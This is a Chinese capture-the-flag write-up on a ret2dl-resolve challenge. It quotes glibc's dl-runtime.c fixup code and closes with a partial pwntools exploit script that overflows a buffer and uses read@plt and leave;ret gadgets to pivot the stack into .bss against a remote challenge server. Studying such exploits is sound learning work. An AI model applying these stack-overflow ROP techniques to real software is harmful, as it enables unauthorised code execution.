# RET2DL

题目来源：http://xmctf.top/

Partial RELRO和No RELRO的区别可以看这个[文章](https://blog.csdn.net/seaaseesa/article/details/104478081)

![image-20200503183905003](/Users/migraine/Library/Application Support/typora-user-images/image-20200503183905003.png)

见到Return to dl-resolve，一般来说直接roputils一把梭。不知道为何，在使用ret2plt时候，read的got表被清空了。。。直接跳转到0x0，不能使用read来输入更多的数据。所以这次就把这部分的知识重新理一下吧。参考这篇[文章](https://bbs.pediy.com/thread-227034.htm)。

![ret2plt出问题](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/0f1vk0.png)

**glibc/elf/dl-runtime.c**



```c
#define IN_DL_RUNTIME 1		/* This can be tested in dl-machine.h.  */

#include <alloca.h>
#include <stdlib.h>
#include <unistd.h>
#include <ldsodefs.h>
#include "dynamic-link.h"

#if (!defined ELF_MACHINE_NO_RELA && !defined ELF_MACHINE_PLT_REL) \
    || ELF_MACHINE_NO_REL
# define PLTREL  ElfW(Rela)
#else
# define PLTREL  ElfW(Rel)
#endif

#ifndef VERSYMIDX
# define VERSYMIDX(sym)	(DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))
#endif


/* This function is called through a special trampoline from the PLT the
   first time each PLT entry is called.  We must perform the relocation
   specified in the PLT of the given shared object, and return the resolved
   function address to the trampoline, which will restart the original call
   to that address.  Future calls will bounce directly from the PLT to the
   function.  */

#ifndef ELF_MACHINE_NO_PLT
static ElfW(Addr) __attribute_used__
fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
        ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	/* GKM FIXME: Fix trampoline to pass bounds so we can do
	   without the `__unbounded' qualifier.  */
       struct link_map *__unbounded l, ElfW(Word) reloc_offset)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  ElfW(Addr) value;

  /* The use of `alloca' here looks ridiculous but it helps.  The goal is
     to prevent the function from being inlined and thus optimized out.
     There is no official way to do this so we use this trick.  gcc never
     inlines functions which use `alloca'.  */
  alloca (sizeof (int));

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      switch (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	default:
	  {
	    const ElfW(Half) *vernum =
	      (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	    const struct r_found_version *version = &l->l_versions[ndx];

	    if (version->hash != 0)
	      {
		result = INTUSE(_dl_lookup_versioned_symbol) (strtab
							      + sym->st_name,
							      l, &sym, l->l_scope,
							      version,
							      ELF_RTYPE_CLASS_PLT,
							      0);
		break;
	      }
	  }
	case 0:
	  result = INTUSE(_dl_lookup_symbol) (strtab + sym->st_name, l, &sym,
					      l->l_scope, ELF_RTYPE_CLASS_PLT,
					      DL_LOOKUP_ADD_DEPENDENCY);
	}

      /* Currently result contains the base load address (or link map)
	 of the object that defines sym.  Now add in the symbol
	 offset.  */
      value = (sym ? LOOKUP_VALUE_ADDRESS (result) + sym->st_value : 0);
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
	 address) is also known.  */
      value = l->l_addr + sym->st_value;
#ifdef DL_LOOKUP_RETURNS_MAP
      result = l;
#endif
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

  /* Finally, fix up the plt itself.  */
  if (__builtin_expect (GL(dl_bind_not), 0))
    return value;

  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
#endif

#if !defined PROF && !defined ELF_MACHINE_NO_PLT && !__BOUNDED_POINTERS__

static ElfW(Addr) __attribute_used__
profile_fixup (
#ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
       ELF_MACHINE_RUNTIME_FIXUP_ARGS,
#endif
       struct link_map *l, ElfW(Word) reloc_offset, ElfW(Addr) retaddr)
{
  void (*mcount_fct) (ElfW(Addr), ElfW(Addr)) = INTUSE(_dl_mcount);
  ElfW(Addr) *resultp;
  lookup_t result;
  ElfW(Addr) value;

  /* The use of `alloca' here looks ridiculous but it helps.  The goal is
     to prevent the function from being inlined, and thus optimized out.
     There is no official way to do this so we use this trick.  gcc never
     inlines functions which use `alloca'.  */
  alloca (sizeof (int));

  /* This is the address in the array where we store the result of previous
     relocations.  */
  resultp = &l->l_reloc_result[reloc_offset / sizeof (PLTREL)];

  value = *resultp;
  if (value == 0)
    {
      /* This is the first time we have to relocate this object.  */
      const ElfW(Sym) *const symtab
	= (const void *) D_PTR (l, l_info[DT_SYMTAB]);
      const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

      const PLTREL *const reloc
	= (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
      const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];

      /* Sanity check that we're really looking at a PLT relocation.  */
      assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

      /* Look up the target symbol.  If the symbol is marked STV_PROTECTED
	 don't look in the global scope.  */
      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
	{
	  switch (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	    {
	    default:
	      {
		const ElfW(Half) *vernum =
		  (const void *) D_PTR (l,l_info[VERSYMIDX (DT_VERSYM)]);
		ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
		const struct r_found_version *version = &l->l_versions[ndx];

		if (version->hash != 0)
		  {
		    result = INTUSE(_dl_lookup_versioned_symbol) (strtab
								  + sym->st_name,
								  l, &sym,
								  l->l_scope,
								  version,
								  ELF_RTYPE_CLASS_PLT,
								  0);
		    break;
		  }
	      }
	    case 0:
	      result = INTUSE(_dl_lookup_symbol) (strtab + sym->st_name, l,
						  &sym, l->l_scope,
						  ELF_RTYPE_CLASS_PLT,
						  DL_LOOKUP_ADD_DEPENDENCY);
	    }

	  /* Currently result contains the base load address (or link map)
	     of the object that defines sym.  Now add in the symbol
	     offset.  */
	  value = (sym ? LOOKUP_VALUE_ADDRESS (result) + sym->st_value : 0);
	}
      else
	{
	  /* We already found the symbol.  The module (and therefore its load
	     address) is also known.  */
	  value = l->l_addr + sym->st_value;
#ifdef DL_LOOKUP_RETURNS_MAP
	  result = l;
#endif
	}
      /* And now perhaps the relocation addend.  */
      value = elf_machine_plt_value (l, reloc, value);

      /* Store the result for later runs.  */
      if (__builtin_expect (! GL(dl_bind_not), 1))
	*resultp = value;
    }

  (*mcount_fct) (retaddr, value);

  return value;
}

#endif /* PROF && ELF_MACHINE_NO_PLT */


/* This macro is defined in dl-machine.h to define the entry point called
   by the PLT.  The `fixup' function above does the real work, but a little
   more twiddling is needed to get the stack right and jump to the address
   finally resolved.  */

ELF_MACHINE_RUNTIME_TRAMPOLINE

```







```python
#!/usr/bin/python
from pwn import *
from roputils import *

context.terminal = ['tmux','splitw','-h' ]
debug=1
elf=ELF('./ret2dl32')
if debug:
    p=process("./ret2dl32",env={"LD_PRELOAD":"/glibc/2.23/32/lib/libc.so.6"})
    context.log_level='Debug'
    gdb.attach(p,"b *0x08048468")
else:
    p=remote("nc.eonew.cn",10507)

s  = lambda data    :p.send(data)
sl = lambda data    :p.sendline(data)

ppp_ret=0x080484d9 #pop esi ; pop edi ; pop ebp ; ret
leave_ret=0x08048378 #leave ;ret
read_plt=0x80482e0
#read_plt=0x804a00c
print "[+]read_plt="+hex(read_plt)

bss=0x804a020
base_stage=bss+0x800
fake_esp=bss+0x600
#buf_addr=0x804a170 

payload = "A"*0x10c+p32(0x804a15c)+p32(0)*2
#payload = payload.ljust(0x100,'\x01')
payload += p32(read_plt) + p32(ppp_ret)
payload += p32(0) + p32(fake_esp) + p32(0x200)
payload += p32(leave_ret)

s(payload)


p.interactive()
```

